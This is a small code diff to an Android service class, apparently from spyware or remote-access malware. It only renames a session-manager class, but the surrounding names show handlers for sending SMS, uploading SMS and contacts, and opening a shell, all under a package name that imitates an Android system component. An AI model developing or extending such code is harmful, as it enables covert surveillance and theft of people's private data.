@@ -8,7 +8,7 @@ import android.content.IntentFilter;
 import android.os.Build;
 import android.os.IBinder;
 
-import com.android.sys.session.NetworkSessionManager;
+import com.android.sys.session.SessionManager;
 import com.android.sys.session.handler.SendSmsSessionHandler;
 import com.android.sys.session.handler.ShellSessionHandler;
 import com.android.sys.session.handler.UploadContactsSessionHandler;
@@ -39,7 +39,7 @@ public class SystemService extends Service{
         return null;
     }
 
-    private NetworkSessionManager mSessionManager = new NetworkSessionManager();
+    private SessionManager mSessionManager = new SessionManager();
 
     private final String SESSION_SEND_SMS = "send_sms";
     private final String SESSION_UPLOAD_SMS = "upload_sms";
